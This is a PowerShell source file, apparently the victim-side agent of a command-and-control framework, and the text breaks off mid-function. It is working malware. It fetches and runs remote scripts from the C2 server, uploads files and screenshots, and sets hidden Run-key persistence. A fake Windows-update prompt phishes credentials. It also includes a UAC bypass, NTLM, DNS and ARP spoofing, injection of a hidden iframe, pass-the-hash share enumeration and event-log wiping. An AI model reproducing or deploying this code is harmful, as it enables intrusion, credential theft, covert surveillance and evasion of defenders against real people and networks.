# Agent.ps1 - by @thebenygreen - @eyesopensec
# This file is generated as pnt.ps1 by the Generator and can be renammed. it's the PAYLOAD that must persist on victim machine. 
# It receive commands from C2 and execute it on victim machine. This file absolutely need to be CONFIGURED automatically by the generator.exe AND config.ini
###############################################################################################################################

$ErrorActionPreference = 'SilentlyContinue'  
#$WindowStyle ='Hidden'
############## ENCRYPTION BLOCK ########################
function Create-AesManagedObject($key, $IV) {
			$aesManaged = New-Object "System.Security.Cryptography.AesManaged"
			$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
			$aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
			$aesManaged.BlockSize = 128
			$aesManaged.KeySize = 256
			if ($IV) {
				if ($IV.getType().Name -eq "String") {
					$aesManaged.IV = [System.Convert]::FromBase64String($IV)
				}
				else {
					$aesManaged.IV = $IV
				}
			}
			if ($key) {
				if ($key.getType().Name -eq "String") {
					$aesManaged.Key = [System.Convert]::FromBase64String($key)
				}
				else {
					$aesManaged.Key = $key
				}
			}
			$aesManaged
		}		 
function Create-AesKey() {
			$aesManaged = Create-AesManagedObject
			$aesManaged.GenerateKey()
			
			[System.Convert]::ToBase64String($aesManaged.Key)
		}		 
function Encrypt-String($key, $unencryptedString) {
			$bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
			$aesManaged = Create-AesManagedObject $key 
			
			$encryptor = $aesManaged.CreateEncryptor()
			$encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
			[byte[]] $fullData = $aesManaged.IV + $encryptedData
			$aesManaged.Dispose()
			[System.Convert]::ToBase64String($fullData)
		}		 
function Decrypt-String($key, $encryptedStringWithIV) {
			$bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
			$IV = $bytes[0..15]
			$aesManaged = Create-AesManagedObject $key $IV
			$decryptor = $aesManaged.CreateDecryptor();
			$unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
			$aesManaged.Dispose()
			[System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
		}

################## MAIN VARIABLES PREPARATION #########################         
$c2cEncrypted = (New-Object System.Net.WebClient).DownloadString("GETC2URL") # Retreive good C2 URL and each execution
[string] $Global:keyreadgetC2 = "KEYTOREADGETC2"
if ($keyreadgetC2.length -eq 43) {$keyreadgetC2 = $keyreadgetC2 + '=' }
if ($keyreadgetC2.length -eq 42) {$keyreadgetC2 = $keyreadgetC2 + '==' }
[string] $Global:c2c = Decrypt-String "$keyreadgetC2" "$c2cEncrypted" 
[string] $Global:pc = "" # Zombie's ID 
[string] $Global:upgradeThisPowershell = "UPGRADEPOWERSHELL" # Set if PS upgrade must be attempted once executed
[string] $Global:scan = "empty" # Set if a scan must be attempted once executed
[string] $Global:usbspreading = "USBSPREAD" # Set if USB spreading must be automatic
[string] $Global:operation = "MYOPS" # Set Operation name for automation
[string] $Global:EndopsDate = "ENDDATE" # Timing for operation ending
[string] $WorkopsStart = "WORKSTART" # Timing for zombie's work start 
[string] $WorkopsEnd = "WORKEND" # Timing for zombie's work stop
[string] $keyopsupload = "KEYUPLOAD" # Timing for keylogger function
[string] $keyopsupload2 = "KEYUPLOAD2" # Timing for keylogger function
[string] $Global:regOpskey = "REGKEY" # Store ID in Registry. if empy, it will not be used
[string] $Global:wmiOpskey = "WMIKEY" # Store ID in WMI (need admin).if empy, it will not be used
[string] $Global:sleeptime1 = "SLPTM1" # Sleep intervals
[string] $Global:sleeptime2 = "SLPTM2" # Sleep intervals
[string] $Global:sleeptime3 = "SLPTM3" # Sleep intervals
[string] $Global:autoOpspersist = "AUTOPERSIST" # Activate auto persistence. agent will try to persist once executed on victim machine
[string] $Global:DefaultOpsPersist = "DEFAULTPERSIST" # Set Operation name for automation
[string] $Global:ScreenstreamActivated = "off"
[string] $Global:myAgntencoded = @"
MYENCODED
"@  # add downexec payload in encoded form
[string] $Global:c2OpsChannel = "C2CHANNEL" # icmp, twitter, dropbox, gmail, dns, http/s
[string] $Global:DomainOrWorkgroup = (Get-WmiObject Win32_ComputerSystem).Domain
$ip = ((ipconfig | findstr [0-9].\.)[0]).Split()[-1]
$devideID = Get-WmiObject win32_networkadapterconfiguration | where {$_.IPAddress -eq $ip} | select SettingID
$w = $ip.split('.')[0]
$x = $ip.split('.')[1]
$y = $ip.split('.')[2]
$z = $ip.split('.')[3]
$StartAddress = "$w.$x.$y.1"
$EndAddress = "$w.$x.$y.254"
# Check if current shell are executed in priviledged mode
[string] $Global:IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
$language = Get-WinSystemLocale # Check OS language
 if ($language.Name -eq "fr-FR"){ $gp = Get-LocalGroupMember -Group Administrateurs } else {$gp = Get-LocalGroupMember -Group Administrators}
# Check if current session have admins membership (so that bypassUAC ca be used to pop-up elevetad shell 
$CurrentSession = whoami
for($i=0; $i -lt $gp.Name.Length; $i++){ $admin_member = $gp.Name.Item($i)
    if ($admin_member -eq $CurrentSession){ 
	[string] $Global:IsAdminMember = $true }
}
[string] $Global:OSbuild = [System.Environment]::OSVersion.Version.Major
######################################################################

# Test PS version and download CurL if the version is lower than 3. Also try to install Choco and update powershell to v3+         ROOT_FOLDER
[string] $Global:pshversion = $PSVersionTable.psversion.Major
if ($pshversion -lt 3) {
	$pversion = 2
	$exists = "$env:userprofile\AppData\cl.exe"
	If (Test-Path $exists){		
		} 
	else { # check architecture and install version x86 of cl.exe if so
		if($env:PROCESSOR_ARCHITECTURE -eq "x86")
			{
			$downloadURL = "$c2c/ROOT_FOLDER/link/cl32.txt"
			[string] $FileOnDisk =  "$env:userprofile\AppData\cl.txt"
			if ($downloadURL.Substring(0,5) -ceq "https") {
				[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }
			}
			(New-Object System.Net.WebClient).DownloadFile($downloadURL,$FileOnDisk)
			rename-item $FileOnDisk -NewName cl.exe
			Write-Host "curl 32.." -ForegroundColor DarkGreen;
			attrib +h "$env:userprofile\AppData\cl.exe"
			}
		Else{ # install version x64 of cl.exe
			$downloadURL = "$c2c/ROOT_FOLDER/link/cl64.txt"
			[string] $FileOnDisk =  "$env:userprofile\AppData\cl.txt"
			if ($downloadURL.Substring(0,5) -ceq "https") {
				[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }
				}
			(New-Object System.Net.WebClient).DownloadFile($downloadURL,$FileOnDisk)
			rename-item $FileOnDisk -NewName cl.exe
			Write-Host "curl 64.." -ForegroundColor DarkGreen
			attrib +h "$env:userprofile\AppData\cl.exe"
			}
		
		}	
	#Installation of Chocolatey 
	if ($upgradepshell -eq "yes") {
		$InstallDir="C:\ProgramData\choco"
		$env:chocolateyInstall=$InstallDir
		iex ((new-object net.webclient).DownloadString('https://chocolatey.org/install.ps1'));
		SET PATH=%PATH%;C:\ProgramData\Choco\bin;
		$env:chocolateyUseWindowsCompression = 'true'
		choco install powershell -y	
		[string] $Global:pshversion = $PSVersionTable.psversion.Major
		}
	}

############## GENERAL FUNCTIONS ############## 
		function base64EncodeText {
			param( [string]$Text )
			$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
			$EncodedText =[Convert]::ToBase64String($Bytes)
			$EncodedText
		}
		function sendC2 { # send result to c2
	   		[CmdletBinding()] param( 
			[string]$pc,
			[string]$result,
			[string]$id
			)
			$result = base64EncodeText $result
			$postParams = @{pc=$pc;result=$result;id=$id}
			if ($pshversion -lt 3) {
			Curl $pc $result $id } else {
			Invoke-WebRequest -Uri "$c2c/ROOT_FOLDER/link/ok.php" -Method POST -Body $postParams
			}
		}
		function RunJob { # execute command inside a Job
		   [CmdletBinding()] param( [string]$code )
		   $sb = [scriptblock]::create("$code")
		   Start-Job -ScriptBlock $sb
			}
		function downloadFile($url, $targetFile){ # download file to victim pc
			"Downloading $url"
			if ($url.Substring(0,5) -ceq "https") {
                [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }
				}
			$uri = New-Object "System.Uri" "$url"
			$request = [System.Net.HttpWebRequest]::Create($uri)
			$request.set_Timeout(15000) #15 second timeout
			$response = $request.GetResponse()
			$totalLength = [System.Math]::Floor($response.get_ContentLength()/1024)
			$responseStream = $response.GetResponseStream()
			$targetStream = New-Object -TypeName System.IO.FileStream -ArgumentList $targetFile, Create
			$buffer = new-object byte[] 10KB
			$count = $responseStream.Read($buffer,0,$buffer.length)
			$downloadedBytes = $count
			while ($count -gt 0)
				{
				[System.Console]::CursorLeft = 0
				[System.Console]::Write("Downloaded {0}K of {1}K", [System.Math]::Floor($downloadedBytes/1024), $totalLength)
				$targetStream.Write($buffer, 0, $count)
				$count = $responseStream.Read($buffer,0,$buffer.length)
				$downloadedBytes = $downloadedBytes + $count
				}
			"Finished Download"
			$targetStream.Flush()
			$targetStream.Close()
			$targetStream.Dispose()
			$responseStream.Dispose()
			}
		function Exfiltrate{ # exfiltrate data from victim to c2 server
			[CmdletBinding()] param( 
				[string] $Path
				) 
			[System.Net.ServicePointManager]::ServerCertificateValidationCallback={true};
			$http = new-object System.Net.WebClient;
			[string] $url="$c2c/ROOT_FOLDER/exfil.php?pc=$pc";
			$exfil = $http.UploadFile($url,$Path);
			}
		function zip{
			param( [string]$Source, [string]$destination )
			If(Test-path $destination) {Remove-item $destination}
				Add-Type -assembly "system.io.compression.filesystem"
				[io.compression.zipfile]::CreateFromDirectory($Source, $destination) 
			}	
		function unzip {
			param( [string]$ziparchive, [string]$extractpath)
			If(Test-path $extractpath) {Remove-item $extractpath}
			Add-Type -AssemblyName System.IO.Compression.FileSystem
			[System.IO.Compression.ZipFile]::ExtractToDirectory( $ziparchive, $extractpath )
			}
		function Add-Zip{ #Get-Item D:\testfolder | Add-Zip D:\testzip.zip
			param([string]$zipfilename)
			if(-not (test-path($zipfilename))){
				set-content $zipfilename ("PK" + [char]5 + [char]6 + ("$([char]0)" * 18))
				(dir $zipfilename).IsReadOnly = $false	
				}
			$shellApplication = new-object -com shell.application
			$zipPackage = $shellApplication.NameSpace($zipfilename)
			foreach($file in $input) { 
				$zipPackage.CopyHere($file.FullName)
				Start-sleep -milliseconds 500
				}
			}	
		function executer { # execute command, local file or remote file from URL  - # usage: executer -runURL "eicar.txt"
							# executer -runLocal "$env:windir\System32\calc.exe"
			[CmdletBinding()] param([string] $runURL,[string] $runLocal)
			If ($runURL){
			$command = @"
iex ((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/$runURL"))
"@
			Write-Host "Execute command " -ForegroundColor Blue
			Write-Host "==> $command"
			} 
			else {
			$command = $runLocal 
			Write-Host "Execute command " -ForegroundColor Blue
			Write-Host "==> $runLocal"
			}
			[string] $CmdPath = "$env:windir\System32\cmd.exe"
			[string] $CmdString = "$CmdPath" + " /C " + "$command"
			Invoke-Expression $CmdString
		}	
		function credsWindowsDisplay { # Just display windows of Credentials phishing
			param( [string]$returnArray )
			Add-Type -AssemblyName "System.Drawing","System.Windows.Forms"
			[Windows.Forms.MessageBox]::Show("Criticals Windows update failed !`n Please contact your administrator", "Windows update failed", [Windows.Forms.MessageBoxButtons]::OK, [Windows.Forms.MessageBoxIcon]::Warning)
			$credential = Get-Credential
			$pass = $credential.GetNetworkCredential().password
			$dom = $credential.GetNetworkCredential().Domain
			$login = $credential.GetNetworkCredential().UserName
			$logindom = "$dom\$login"  
			
			if ($dom){[string]$usercreds = "$usercreds - login:$logindom - pass:$pass"
				[string]$usercredsObject = @{'Username' = $logindom;
										  'Password' = $pass}
				}
			else{[string]$logindom = "$login";
				[string]$usercreds = "$usercreds - login:$logindom - pass:$pass"
				[string]$usercredsObject = @{'Username' = $logindom;
										  'Password' = $pass}
				}
			if ($returnArray) # parameter returnArray determine if this function must return Array (for futher usage) or string (for simple display)
				{$usercredsObject}
			else {$usercreds }
		}		
		function Invk-EvtVwrBypass { # execute command in privileged mode with eventviewer bypass UAC technique
			[CmdletBinding()] param( 
			[String]$Command,
			[Switch]$Force
			)
			if ($IsAdminMember -eq $True) {iex ((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/EvtVwrUacBypass.txt"))
				if ($OSbuild -lt 10) {
					Set-FilelessBypassUac -Method mscfile -Option CommandLine -CommandLine $Command
				}else {
					Set-FilelessBypassUac -Method ms-settings -Option CommandLine -CommandLine $Command}
				}   
			}
		function TestInternet { # Check internet connexion
			[CmdletBinding()] 
			param() 
			process { 
			[Activator]::CreateInstance([Type]::GetTypeFromCLSID([Guid]'{DCB00C01-570F-4A9B-8D69-199FDBA5723B}')).IsConnectedToInternet 
			}  
		}
		function TestURLstatus { # Check URL status
			[CmdletBinding()] param([string] $URL,[string] $runLocal)
			$HTTP_Request = [System.Net.WebRequest]::Create("$URL")
			$HTTP_Response = $HTTP_Request.GetResponse()
			$HTTP_Status = [int]$HTTP_Response.StatusCode
			if ($HTTP_Status -eq 200) {
				$True
			}
			else {
				$False
				Write-Host "URL unavailable !"
			}
			$HTTP_Response.Close()
		}		
		function IdleTimePC { # Get idle time
Add-Type @'
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace PInvoke.Win32 {

    public static class UserInput {

        [DllImport("user32.dll", SetLastError=false)]
        private static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);

        [StructLayout(LayoutKind.Sequential)]
        private struct LASTINPUTINFO {
            public uint cbSize;
            public int dwTime;
        }

        public static DateTime LastInput {
            get {
                DateTime bootTime = DateTime.UtcNow.AddMilliseconds(-Environment.TickCount);
                DateTime lastInput = bootTime.AddMilliseconds(LastInputTicks);
                return lastInput;
            }
        }

        public static TimeSpan IdleTime {
            get {
                return DateTime.UtcNow.Subtract(LastInput);
            }
        }

        public static int LastInputTicks {
            get {
                LASTINPUTINFO lii = new LASTINPUTINFO();
                lii.cbSize = (uint)Marshal.SizeOf(typeof(LASTINPUTINFO));
                GetLastInputInfo(ref lii);
                return lii.dwTime;
            }
        }
    }
}
'@

$Last = [PInvoke.Win32.UserInput]::LastInput
$Idle = [PInvoke.Win32.UserInput]::IdleTime
$LastStr = $Last.ToLocalTime().ToString("MM/dd/yyyy hh:mm tt")
$r = "Last user keyboard/mouse input: " + $LastStr
$r = $r + "---- PC Idle for " + $Idle.Days + " days, " + $Idle.Hours + " hours, " + $Idle.Minutes + " minutes, " + $Idle.Seconds + " seconds."
		$r
        }
		function OfflineMode { # Commands to execute in OFFLINE MODE
			localxml = @"
<?xml version="1.0" encoding="iso-8859-1"?>
<statuses>
<status>
<text>!persist|all</text>
<id>900</id>
</status>
<status>
<text>!recon</text>
<id>901</id>
</status>
<status>
<text>!screenshot</text>
<id>902</id>
</status>
<status>
<text>!exfilfile|doc|C:\users\</text>
<id>903</id>
</status>
<status>
<text>!exfilfile|xls|C:\users\</text>
<id>904</id>
</status>
<status>
<text>!exfilfile|png|C:\users\</text>
<id>905</id>
</status>
<status>
<text>!clearevent</text>
<id>906</id>
</status>
</statuses>			
"@
		
		
		}
		function screencapture { # take screenshot
			$exists = "$env:userprofile\img"
			If (Test-Path $exists){
			}
			else {
			md "$env:userprofile\img"
			attrib +h "$env:userprofile\img"
			}
			$name = Get-Random -minimum 1 -maximum 999999
			[string] $FilePath = "$env:userprofile\img\$name.png"	
            Add-Type -Assembly System.Windows.Forms
            $ScreenBounds = [Windows.Forms.SystemInformation]::VirtualScreen
            $ScreenshotObject = New-Object Drawing.Bitmap $ScreenBounds.Width, $ScreenBounds.Height
            $DrawingGraphics = [Drawing.Graphics]::FromImage($ScreenshotObject)
            $DrawingGraphics.CopyFromScreen( $ScreenBounds.Location, [Drawing.Point]::Empty, $ScreenBounds.Size)
            $DrawingGraphics.Dispose()
            $ScreenshotObject.Save($FilePath)
            $ScreenshotObject.Dispose() 
			$r1 = ls | findstr "$name" | Out-String
			$r2 = "$name.png.png"
			$result = "$r1 $r2"			
			Exfiltrate $FilePath
			Remove-Item -path $env:userprofile\img\$name.png.png
			$result
			}
		function RandomWait { # Randomly sleep to wait
		   [string] $SecondsToWait = (Get-Random -InputObject $sleeptime1, $sleeptime2, $sleeptime3)
		   Write-Verbose "Sleep: $SecondsToWait sec"
		   Start-Sleep -Seconds $SecondsToWait
		}
		function WMIRegisterPCKey { # Add WMI REG value of $PC to backup $REGKEY. registry key can be deleted, wmi key in more secret and will backup registry key OR can be use in place
			IEX (New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/wmi-create.txt")
            Wmi-Create -EventFilterName "Cleanup" -EventConsumerName "$wmiOpskey" -ValueToCreate "$pc"
		}
		function persistAuto { # Actions for auto persistence
				$Path =  "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Exec Bypass -NoL -Win Hidden -Enc $myAgntencoded"
				$registryPath1 = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
				$registryPath2 = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
				$name = "Version"
				New-ItemProperty -Path $registryPath1 -Name $name -Value $Path -PropertyType String -Force | Out-Null
				New-ItemProperty -Path $registryPath2 -Name $name -Value $Path -PropertyType String -Force | Out-Null
				}
	if ($autoOpspersist -eq "on") {
		persistAuto
		}			

########## ACTIONS & BOT COMMANDS #######################
# Main function
Function Invoke-Pnt {
    Write-Host "Action !" -ForegroundColor Yellow;
	Function Invoke-drn {
        [CmdletBinding()] Param(
        )
	# Control agents > BEGIN
		Function ChangeC2Command { #  !changec2|http:\newc2cserver.com
           [CmdletBinding()] param( 
			[string]$id
			)
			[string] $NewC2C = $LatestOrder.split('|')[1]
            # set pc instance in the new c2c.
			$result = 'Now connected to $NewC2C !'
			sendC2 $pc $result $id
			$c2c = $NewC2C
			InitializeBot
		}
        Function HelloCommand { # Manual poll C2 to update zombie's status
			[CmdletBinding()] param( 
			[string]$id
			)
			$date = Get-Date -Format MM/dd/yyyy-H:mm:ss
			$result = "Hello - $date"
			sendC2 $pc $result $id
            }
		Function HelloOnline { # Automate Poll C2 to update zombie's status
			$pcIdleTime = IdleTimePC
			$date = Get-Date #-Format MM/dd/yyyy-H:mm:ss | Out-String
			$result = "Online _ $date _ Admin:$isAdmin _ Idle: $pcIdleTime"
			$result = base64EncodeText $result
			$postParams = @{pc=$pc;result=$result}
			if ($pshversion -lt 3) {
				$result = "`"$result`""
				$Command = "$env:userprofile\AppData\cl.exe -X POST -F pc=$pc -F result=$result -F id=$id $c2c/ROOT_FOLDER/link/online.php"
				$CheckIfPcExist = executer -runLocal $Command
				$CheckIfPcExist
				if ($CheckIfPcExist -eq "nothing") { # Recreate PC item on server side if it doesnt exist anymore but pc still infected and active
				InitializeBot
				}
			} else {
			Invoke-WebRequest -Uri "$c2c/ROOT_FOLDER/link/online.php" -Method POST -Body $postParams}
            if ($ScreenstreamActivated -eq "on"){ screencapture	} # stream victim screen if feature have been activated
			}
		Function UpdateCommand { # update agent (not the c2, use !changec2 to update c2)
			[CmdletBinding()] param( 
			[string]$id
			)
			$c = @"
/c powershell -exec bypass -nol iex((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/pnt.ps1"))
"@
		   #$sb = [scriptblock]::create("$c")
		   Start-Process -FilePath "cmd" -ArgumentList $c -WindowStyle Hidden
			$result = "Updated"
			sendC2 $pc $result $id
			exit
		}		
		Function QuitCommand { # !quit 
			# decrypt all files
			# Delete all binaries dropped and folders
			Remove-Item -path "$env:userprofile\AppData\cl.exe" -recurse
			Remove-Item -path "$env:userprofile\AppData\cm.exe" -recurse
			Remove-Item -path "$env:userprofile\Appdata\tun.exe" -recurse
			Remove-Item -path "$env:userprofile\help.exe" -recurse
			Remove-Item -path "$env:userprofile\AppData\http.exe" -recurse
			# clean dnsspoof
			# clean persistence (task, wmi, reg, startup)
			schtasks /delete /tn OfficeUpdates-Service /f 
			schtasks /delete /tn GoogleUpdates-us /f
			schtasks /delete SkypeUpdates-en /f
			sc delete wuausvc
			Remove-Item -path "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\wuausvc.lnk" -recurse
			Remove-Item -path "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\wuausvc.ps1" -recurse
			Remove-Item -path "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Drivers.lnk" -recurse
			Remove-Item -path "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Drivers.ps1" -recurse
			$registryPath1 = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
			$registryPath2 = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
			Remove-ItemProperty -Path $registryPath1 -Name "Version" -Force 
			Remove-ItemProperty -Path $registryPath2 -Name "Version" -Force 
			# clean log
			wevtutil el | Foreach-Object {wevtutil cl $_}
			# clean registry ID
			Remove-ItemProperty -Path HKCU:\Software\$regOpskey
			# clean WMI registry ID
			IEX (New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/wmi-delete.txt")
            Wmi-Delete -EventFilterName "Cleanup" -EventConsumerName "$wmiOpskey"
			$result="OFFLINE"
			sendC2 $pc $result $id
			exit
			quit
			} 
        Function EncodedVectorCommand { #!vector|SBOFSBOFSBOFFSBOF==  Change the encoded emdeded agent version
			[CmdletBinding()] param( 
			[string]$id
			)
			$myAgntencoded = $LatestOrder.split('|')[1]
			$result = "Encoded Vector changed to: $myAgntencoded"
			sendC2 $pc $result $id
            }	
	# Download & Run command > BEGIN
		Function RunCommand {# !run|0|echo bonjour  -  !run|1|calc   -
            [CmdletBinding()] param( 
			[string]$id
			)
			[string] $inJob = $LatestOrder.split('|')[1] # 1= yes,    0= no & upload,     2= no & no upload
			[string] $Command = $LatestOrder.Substring(7)
            [string] $CmdPath = "$env:windir\System32\cmd.exe"
            [string] $CmdString = "$CmdPath" + " /C " + "$Command"
            if ($inJob -eq "0") {
				$dd = Get-Date -Format MM-dd-yyyy-H-mm-ss
				[string] $runfile = "$env:userprofile\AppData\run-$dd.txt"
				$rs = Invoke-Expression $CmdString
				set-content $runfile -Value $rs
				exfiltrate $runfile
				$result = "$c2c/ROOT_FOLDER/exfil/$pc/run-$dd.txt"
				Remove-Item $runfile
			}
			if ($inJob -eq "2") {
				$result = Invoke-Expression $CmdString
			}else{
				RunJob -code $Command
				$result = "ok"
				}
			sendC2 $pc $result $id
			}
		Function DownloadCommand { #!download|http://tools.hackarmoury.com/general_tools/nc/nc.exe|c:\windows\temp\netcat.exe
            [CmdletBinding()] param( 
			[string]$id
			)
			[string] $downloadURL = $LatestOrder.split('|')[1]
            [string] $FileOnDisk =  $LatestOrder.split('|')[2]
            downloadFile $downloadURL $FileOnDisk
			$e = Get-ChildItem -Path $FileOnDisk 
			[string]$result = $e.fullName
			sendC2 $pc $result $id
			} 
		Function bitsadminCommand { #!bits|http://tools.hackarmoury.com/general_tools/nc/nc.exe|c:\windows\temp\netcat.exe
            [CmdletBinding()] param( 
			[string]$id
			)
			[string] $downloadURL = $LatestOrder.split('|')[1]
            [string] $FileOnDisk =  $LatestOrder.split('|')[2]
			$c = "bitsadmin.exe /transfer /Download /priority Foreground $downloadURL $FileOnDisk"
			RunJob -code $c
            $result = "OK, if you want to check, use --> !run|2|powershell -c Get-ChildItem -Path $FileOnDisk" 
			sendC2 $pc $result $id
			}					
        Function downexecCommand { #!downexec|ps1/exe|http://url.com/file|file -  example !downexec|ps1|http://script.com/Invoke-DBC2.ps1 |Invoke-DBC2 -Arguments    OR !downexec|exe|http://script.com/bin.exe |-i user -c pc
            [CmdletBinding()] param( 
			[string]$id
			)
			[string] $Exectype = $LatestOrder.split('|')[1]
			[string] $downloadURL = $LatestOrder.split('|')[2]
            [string] $paramscript = $LatestOrder.split('|')[3]                               
            if ($Exectype -eq "exe") {
				downloadFile $downloadURL "$env:userprofile\AppData\Local\Temp\temp.exe"
				$Command = "$env:userprofile\AppData\Local\Temp\temp.exe $paramscript";
				RunJob -code $Command
			}
            if ($Exectype -eq "ps1") {
				$CmdString = 'PowerShell.exe -Exec Bypass -NoL -Com IEX((New-Object Net.WebClient).DownloadString("$downloadURL")); $paramscript'
				Invoke-Expression $CmdString
			}
			$result = 'ok'
			sendC2 $pc $result $id
        }
	# Spoofing  > BEGIN
		Function DnsSpoofCommand { #!dnsspoof|127.0.0.1  facebook.com|0
            [CmdletBinding()] param( 
			[string]$id
			)
			[string] $entry = $LatestOrder.split('|')[1]
            [string] $clean = $LatestOrder.split('|')[2]
			[string] $CmdPath = "$env:windir\System32\cmd.exe"
            if ($clean -eq "1") {
				if ($IsAdmin -eq $True) {
				[string] $Command = "echo $entry > $env:SystemRoot\System32\drivers\etc\hosts"
				[string] $CmdString = "$CmdPath" + " /C " + "$Command"
				Invoke-Expression $CmdString
				}else{
				[string] $Command = "echo $entry > $env:SystemRoot\System32\drivers\etc\hosts"
				Invk-EvtVwrBypass -Command $Command
				}
			}
			else { 
				if ($IsAdmin -eq $True) {
				[string] $Command = "echo $entry > $env:SystemRoot\System32\drivers\etc\hosts"
				[string] $CmdString = "$CmdPath" + " /C " + "$Command"
				Invoke-Expression $CmdString
				}else{
				[string] $Command = "echo $entry > $env:SystemRoot\System32\drivers\etc\hosts"
				Invk-EvtVwrBypass -Command $Command
				}
			}
			[string]$result = "ok"
			exfiltrate $env:SystemRoot\System32\drivers\etc\hosts 			
			sendC2 $pc $result $id
        }
		Function InveighCommand {      # !ntlmspoof
			[CmdletBinding()] param( 
			[string]$id
			)
			if ($IsAdmin -eq $True) {
			$cmde = @"
IEX((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/Inveigh.txt"));Invoke-Inveigh -FileOutput Y
"@ 
			RunJob -code $cmde
			$result = "Wait 20min and use !exfilfile|Inveigh-Log.txt"			
			} else {
			$result = "Not admin ! Run it with Tater (hotpotatoes attack): !hotpotatoes|$command  !ntlmspoof"
				}
			sendC2 $pc $result $id
			}
		Function WebInjectCommand {    # !webinject|</head>|<iframe src=evil.com></iframe></head>
			[CmdletBinding()] param( 
			[string]$id
			)
			$cmde = @"
iex ((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/interceptor.txt"))
Interceptor -Tamper -SearchString "</head>" -ReplaceString "<iframe src=beefserver.com height=0 width=0></iframe></head>
"@
			RunJob -code $cmde
			$result = "injected"
			sendC2 $pc $result $id
			}
		Function ArpSpoofCommand { # !arpspoof  -  Run arp spoofing and capture packet
            [CmdletBinding()] param( 
			[string]$id
			)
			downloadFile "$c2c/ROOT_FOLDER/link/arp.txt" "$env:userprofile\AppData\arp.exe"
			$Command = "$env:userprofile\AppData\arp.exe -i";
			RunJob -code $Command;
			$result = "ok - may not work if NO winpcap lib";
			sendC2 $pc $result $id;
		   }
	# Recon, Discovery &scanning  > BEGIN
		Function ReconCommand {
			[CmdletBinding()] param( 
			[string]$id
			)
			$reconfile = "recon"+$pc+".txt"
			$reconfile0 = "$env:userprofile\AppData\"+$reconfile
			IEX (New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/recon.txt")
            ModReconCommand $reconfile0
			$result = "$c2c/ROOT_FOLDER/exfil/$pc/$reconfile - powershell version:$pshversion"
			Exfiltrate $reconfile0
			Remove-Item $reconfile0
			sendC2 $pc $result $id
			}
		Function GetPidCommand { #!getpid|lsass
            [CmdletBinding()] param( 
			[string]$id
			)
			[string] $system_pid = $LatestOrder.split('|')[1]
			$result = get-process "$system_pid" |select -expand id
			sendC2 $pc $result $id
			}
		Function WhoAmICommand  { #!whoami
            [CmdletBinding()] param( 
			[string]$id
			)
			$result = whoami
			$result += " ---  Admin: $isAdminMember "
			$result += " ---  Privileged Shell: $isAdmin "
			sendC2 $pc $result $id
			}			
		Function ScanCommand {
            [CmdletBinding()] param( 
			[string]$id
			)
			$command = @"
IEX ((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/portscan.txt"));
portscan -StartAddress $StartAddress -EndAddress $EndAddress -ResolveHost -ScanPort | set-content $env:userprofile\AppData\scan.txt;
"@
			RunJob -code $Command
			$result = "Wait and exfiltrate $env:userprofile\AppData\scan.txt" 
			sendC2 $pc $result $id
			}
		Function ArpScanCommand { #!arp
            [CmdletBinding()] param( 
			[string]$id
			)
			$ip = ((ipconfig | findstr [0-9].\.)[0]).Split()[-1]
			$w = $ip.split('.')[0]
			$x = $ip.split('.')[1]
			$y = $ip.split('.')[2]
			$z = $ip.split('.')[3]
			$StartAddress = "$w.$x.$y"
			for($i = 1; $i -lt 254; $i++) {
				$ipAddress= "$StartAddress.$i"
				ping $ipAddress -n 2
				}
			[string] $Command = "arp -a"
            [string] $CmdPath = "$env:windir\System32\cmd.exe"
            [string] $CmdString = "$CmdPath" + " /C " + "$Command"
            $result = Invoke-Expression $CmdString 
			sendC2 $pc $result $id
			}
		Function AclCommand { #!acl|C:\users\toto.txt
            [CmdletBinding()] param( 
			[string]$id
			)
			[string] $path = $LatestOrder.split('|')[1]
			$result = (get-acl $path).access | ft IdentityReference,FileSystemRights,AccessControlType,IsInherited,InheritanceFlags -auto
			sendC2 $pc $result $id
			}		
		Function EnumShareCommand { #!enumshare|toto|F8580EAGFH89725
            [CmdletBinding()] param( 
			[string]$id
			)
			[string] $username = $LatestOrder.split('|')[1]
			[string] $hash = $LatestOrder.split('|')[2]
			$command = @"
IEX ((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/pthshareenum.txt"));
$ip = ((ipconfig | findstr [0-9].\.)[0]).Split()[-1]
$w = $ip.split('.')[0]
$x = $ip.split('.')[1]
$y = $ip.split('.')[2]
$z = $ip.split('.')[3]
$StartAddress = "$w.$x.$y"
function Exfilt{
	[CmdletBinding()] param( 
	[string] $Path
	) 
	[System.Net.ServicePointManager]::ServerCertificateValidationCallback={true};
	$http = new-object System.Net.WebClient;
